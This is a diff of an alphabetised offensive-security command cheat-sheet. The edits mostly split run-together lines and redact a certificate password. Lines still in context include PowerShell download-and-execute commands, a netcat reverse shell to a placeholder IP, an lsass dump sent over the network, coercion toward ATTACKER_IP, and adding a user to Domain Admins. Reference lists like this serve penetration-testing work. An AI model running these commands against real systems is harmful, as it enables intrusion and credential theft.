@@ -228,7 +228,9 @@ bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password $Ta
 bolt.py -u $TARGET
 bqm --list
 bqm --output-path ~/.config/bloodhound/customqueries.json
-bruteforce-luks -t 4 -l 5 -m 5 /dev/sdb1bully wlan1mon -b $MAC -c 9 -S -F -B -v 3burpsuitebuster -e 'j********9@g****.com' -f john -l doe -b '****1989'
+bruteforce-luks -t 4 -l 5 -m 5 /dev/sdb1
+bully wlan1mon -b $MAC -c 9 -S -F -B -v 3
+burpsuitebuster -e 'j********9@g****.com' -f john -l doe -b '****1989'
 btop
 Build a custom wordlist scraping words from a website.
 byp4xx $TARGETcarbon14.py http://menfous.com/
@@ -668,7 +670,9 @@ DonPAPI Poletech-technicien\Administrateur@<ip>
 DonPAPI.py 'domain'/'username':'password'@<'targetName' or 'address/mask'>
 dotnet msbuild /t:Restore /t:Clean /t:Build /p:Configuration=Release /p:DebugSymbols=false /p:DebugType=None /t:ILMerge /p:TrimUnusedDependencies=true
 DotNetToJScript.exe <dll|ExampleAssembly.dll> --lang=Jscript --ver=v4 -o <jscript|runner.js>
-droopescan scan drupal -u $TARGET -t 32drupwn --mode exploit --target $TARGETeaphammer -i eth0 --channel 4 --auth wpa-eap --essid $ESSID --credsps-empire server --restport 8765
+droopescan scan drupal -u $TARGET -t 32
+drupwn --mode exploit --target $TARGET
+eaphammer -i eth0 --channel 4 --auth wpa-eap --essid $ESSID --credsps-empire server --restport 8765
 drupwn --users --nodes --modules --dfiles --themes enum <url>
 dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
 dsquery computer #Get all computers
@@ -739,7 +743,9 @@ evil-winrm -r "$DOMAIN" -i "$TARGET"
 evil-winrm -u "$USER" -H "$NT_HASH" -i "$TARGET"
 evil-winrm -u "$USER" -p "$PASSWORD" -i "$TARGET"
 exif image.jpg
-exifprobe image.pngexiftool image.pngexiv2 image.png
+exifprobe image.png
+exiftool image.png
+exiv2 image.png
 exit
 exploit
 exploit -j
@@ -753,7 +759,6 @@ export KRB5CCNAME=<ccache_file>; smbexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-
 export KRB5CCNAME=`pwd`/'krbtgt.ccache'
 export KRB5CCNAME=administrateur.ccache
 export TERM=xterm-256color
-Extract old passwords
 ExtractBitlockerKeys.py -dc-ip $DC_IP -Username $USERNAME -Password $PASSWORD -ExportToCSV ./keys.csv -ExportToJSON ./keys.jsonEyeWitness.py -f urls.txt --web
 extractor.sh ./git-repo/ ./clean-git-repo/
 faketime '2022-01-31 22:05:35' zsh
@@ -825,8 +830,6 @@ flashrom -p buspirate_spi:dev=<buspirate>,spispeed=<spispeed> -r <output_file>
 flashrom -p buspirate_spi:dev=<buspirate>,spispeed=<spispeed> -r <output_file> -f -c <chipname>
 flashrom -p linux_spi:dev=<spidev>,spispeed=<spispeed> -r <output_file>
 flashrom -p linux_spi:dev=<spidev>,spispeed=<spispeed> -r <output_file> -f -c <chipname>
-Followed by : Enter-PSSession -Computer {<}computer_name}
-follows. You could add additional description inside the paragraph
 for (( a=0; a<=255; a++ )) do ; for (( b=0; b<=255; b++ )) do echo 172.$a.$b.1 >> ip_tofind; done done 
 for (( c=0; c<=255; c++ )) do echo 10.0.$c.1 >> ip_tofind; done 
 for (( c=0; c<=255; c++ )) do echo 192.0.$c.1 >> ip_tofind; done
@@ -856,7 +859,10 @@ ftp audit@<ip>
 ftp root@<ip>
 Full Chain exploit of Shadow Credential: Create a Key Credential, Authenticate to get NT hash and TGT, and remove the Key Credential
 fzf-wordlists
-gau $TARGETgdb binary.bingenusernames 'tony stark'geopincer.py "Texas" "Office Depot" "Sam's Club"
+gau $TARGET
+gdb binary.bin
+genusernames 'tony stark'
+geopincer.py "Texas" "Office Depot" "Sam's Club"
 gcc pwn.c -o <filename|shell>;
 gcl https://github.com/firefart/aquatone
 gcl https://github.com/GoSecure/pywsus
@@ -2134,8 +2140,6 @@ powershell.exe -Command 'IEX (New-Object Net.Webclient).DownloadString("http://<
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<dest_file>')"
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile New-Object System.Net.WebClient.DownloadFile('<url_file>','nc.exe'); nc.exe <ip> <port> -e cmd.exe
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
-Prefill the variable <variable_name> with ``/tmp/wordlist.txt``
-Previously import ticket : 
 printerbug.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST" "$ATTACKER_IP"
 printerbug.py '<domain>/<user>:<password>'@<ip> <attacker_ip>
 printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
@@ -2157,7 +2161,8 @@ prowler azure --managed-identity-auth
 prowler azure --sp-env-auth
 prowler gcp --credentials-file path
 proxmark3 -p /dev/ttyACM0
-proxychains -f config.confpth-net rpc group addmem 'Domain admins' 'attacker_user' -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
+proxychains -f config.conf
+pth-net rpc group addmem 'Domain admins' 'attacker_user' -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
 proxychains -q
 proxychains atexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 proxychains dcomexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
@@ -2869,11 +2874,10 @@ tls-map search iana TLS_DH_RSA_WITH_AES_256_CBC_SHA --output codepoint
 tls-map search nss TLS_AES_256_GCM_SHA384
 tls-map search openssl AES128-SHA --output iana
 tls-scanner -connect "$TARGET":443
-To expose server port remotely (useful to expose your listener)
-To get the port of the client machine locally on serverside.
 tomcatWarDeployer.py -v -x -p $ATTACKER-PORT -H $ATTACKER-IP $TARGET:8080
 Toolset that runs cypher queries against Bloodhound's Neo4j backend and saves output to spreadsheets.
-top or htop
+top
+htop
 tortoutatis -s SESSIONID -u starbucks
 touch <filename-txt>
 touch bin/a
@@ -2903,12 +2907,10 @@ use post/windows/gather/credentials/enum_laps
 use windows/gather/credentials/enum_laps
 User can be a wordlist too (user.txt)
 useradd -p 'openssl passwd -1 <Password>' hacker  
-username-anarchy tony starkVillain.py
-users
-Using \pipe\atsvc via SMB
-using System.Runtime.InteropServices;
-using System;
-usufy -n $USER -p allpass-station search tomcat
+username-anarchy tony stark
+Villain.py
+usufy -n $USER -p all
+pass-station search tomcat
 vaultcmd /list
 VaultCmd /listcreds:"$coffre_name"
 vaultcmd /listcreds:"Windows Credentials" /all #List Windows vault
@@ -2917,11 +2919,13 @@ veracrypt -d
 veracrypt -d <file>
 veracrypt -t --create <file> --hash sha512 --encryption AES --filesystem ext4 --volume-type normal -k "" --pim 0 --size <size>
 veracrypt <file> <mount>
-Villain.py --port 2000 --hoax-port 2001 --netcat-port 2002 --file-smuggler-port 2003volatility2 --profile=Win7SP1x86_23418 netscan -f file.dmp
+Villain.py --port 2000 --hoax-port 2001 --netcat-port 2002 --file-smuggler-port 2003
+volatility2 --profile=Win7SP1x86_23418 netscan -f file.dmp
 vmware-hgfsclient
 vncviewer -password <password.txt> <ip>::<port>
 vncviewer <ip>::<port>
-volatility2 --profile=SomeLinux -f file.dmp linux_netstatvolatility3 -f memory.dmp windows.info
+volatility2 --profile=SomeLinux -f file.dmp linux_netstat
+volatility3 -f memory.dmp windows.info
 volatility3 -f memory.dmp windows.cmdline
 volatility3 -f memory.dmp windows.dlllist --pid $PID
 volatility3 -f memory.dmp windows.filescan
@@ -3087,7 +3091,8 @@ xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
 xrdp <ip>:<display>
 xsltproc -o Rapport_nmap_tcp.html /opt/nmap-bootstrap-xsl/nmap-bootstrap.xsl nmap_tcp.xml
 xsltproc -o Rapport_nmap_udp.html /opt/nmap-bootstrap-xsl/nmap-bootstrap.xsl nmap_udp_script.xml
-XSpear -u $TARGETxsrfprobe -u $TARGETxsser -u $TARGET -g '/login?password=XSS' --Cooxsstrike.py -u $TARGET
+XSpear -u $TARGETxsrfprobe -u $TARGETxsser -u $TARGET -g '/login?password=XSS' --cookie=
+xsstrike.py -u $TARGET
 xspy <ip>
 xwd –root –screen –silent –display <ip>:<display> > screenshot.xwd; convert screenshot.xwd screenshot.png
 xwininfo -root -tree -display <ip>:<display>
@@ -3126,6 +3131,8 @@ zip -u <file>.zip <file_to_add>
 zip <file>.zip *
 zip <file>.zip <files_to_zip>
 zip2john <file>.zip > zip.john;
-zipalign -p -f -v 4 app.apk outfile.apkzsteg -a image.png
-zipdecrypt "key0" "key1" "key2" "encrypted.zip" "decrypted.zip"gettgtpkinit.py -cert-pfx 'sv01.pfx' -pfx-pass 'RLLXdD5FhNPRphSqKGg8' "$DOMAIN"/'sv01$' 'sv01_TGT.ccache'
+zipalign -p -f -v 4 app.apk outfile.apk
+zsteg -a image.png
+zipdecrypt "key0" "key1" "key2" "encrypted.zip" "decrypted.zip"
+gettgtpkinit.py -cert-pfx 'sv01.pfx' -pfx-pass '<PASS>' "$DOMAIN"/'sv01$' 'sv01_TGT.ccache'
 zipinfo <file>.zip
